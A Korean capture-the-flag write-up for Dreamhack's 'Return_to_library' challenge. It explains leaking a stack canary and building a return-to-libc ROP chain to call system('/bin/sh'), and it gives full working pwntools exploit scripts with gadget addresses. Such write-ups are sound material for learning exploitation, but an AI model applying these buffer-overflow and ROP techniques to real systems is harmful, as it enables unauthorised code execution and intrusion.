# [Dreamhack] Return_to_library 풀이

Created: 2022년 12월 2일 오후 8:10
Tags: Pwn

---

## 문제설명

[https://dreamhack.io/wargame/challenges/353/](https://dreamhack.io/wargame/challenges/353/)

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL.png)

카나리 보호기법과 NX 보호기법이 적용되어있는걸 볼 수 있습니다.

```c
#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

첫 입력에서 canary값을 Leak하고 두번째 입력에서 bof를 발생시켜서 전역으로 선언된 /bin/sh을 system함수로 실행시키면 될거같습니다.

## Canary Leak

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL1.png)

메인함수에서 첫번째 read 함수전에 rbp-0x40의 주소를 가져오는것을 보아 buf는 ebp에서 0x40만큼 떨어져있는 것을 알 수 있습니다. 

그럼 0x40(10진수:64)에서 카나리값 크기인 8만큼에서 NULL을 뺀크기인 7을 뺀만큼 입력해주면 카나리값이 출력 될 것 입니다.

```python
from pwn import *

p = remote("host3.dreamhack.games", 13818)
e = ELF("./rtl")

#-----canary_leak------
def slog(name, addr): return success(": ".join([name, hex(addr)]))

payload = b'A' * 57
p.sendafter(b'Buf: ', payload) 
p.recvuntil(payload) #내가 입력한 내용을 날려주는 코드
canary = u64(b'\00' + p.recv(7)) #NULL을 포함해서 카나리값을 받아줍니다.
slog("Canary",canary)
```

위와같이 코드를 짰습니다.

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL2.png)

카나리값이 잘 출력됩니다.

이젠 카나리 값을 구했으니 exploit코드를 마저 짜보겠습니다.

> NX 보호기법때문에 버퍼에 쉘코드를 주입해서 실행시키는건 불가능하기 때문에 반환주소를 조작해야합니다. NX보호기법이 적용된 프로세스에 실행 권한이 있는 메모리 영역은 일반적으로 바이너리의 코드 영역과 바이너리가 참조하는 라이브러리의 코드 영역입니다.
> 

 C코드에 `const char* binsh = "/bin/sh";` 코드때문에 프로세스에 “/bin/sh”이라는 문자열이생기고

`system("echo system@plt");` 코드 때문에 PLT에 system함수를 추가하게됩니다. 이걸 잘 조합하면 이제 “/bin/sh”문자열을 system함수로 실행시키면 쉘을 딸 수 있다.
이제 우리가 알아야하는 정보는 

- system함수의 plt주소
- “/bin/sh”의 주소
- pop rdi ; ret 가젯의 주소
- ret가젯의 주소(이건 movaps issue에대해 공부해보면 됩니다.)

---

### system 함수의 plt주소

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL3.png)

systemplt = 0x4005d0

### “/bin/sh”의 주소

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL4.png)

“/bin/sh” = 0x400874

### pop rdi ; ret 가젯의 주소

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL5.png)

pop_rdi_ret = 0x0000000000400853

### nop

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL6.png)

nop_ret = 0x0000000000400285

---

이제 모든정보를 얻었으니 코드를 짜보겠습니다

```python
from pwn import *

p = process("./rtl")

#-----canary_leak------
def slog(name, addr): return success(": ".join([name, hex(addr)]))

payload = b'A' * 57
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\00' + p.recv(7))
slog("Canary",canary)

#-----exploit------
sys_plt = 0x4005d0
nop = 0x0000000000400285
pop_rdi_ret = 0x0000000000400853
shell = 0x400874

pay = b"A" * 56 + p64(canary) + b"B" * 8
pay += p64(nop)
pay += p64(pop_rdi_ret) #반환주소를 가젯주소로 덮어줍니다.
pay += p64(shell) #이때 /bin/sh의 문자열이 rdi에 들어가게됩니다. 
pay += p64(sys_plt) #이곳에서 rdi ; ret 의 ret이 systemPlt를 가르켜서 system함수가 실행된다.
p.sendafter(b'Buf: ', pay)
p.interactive()
```

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/RTL7.png)

쉘이 따졌습니다.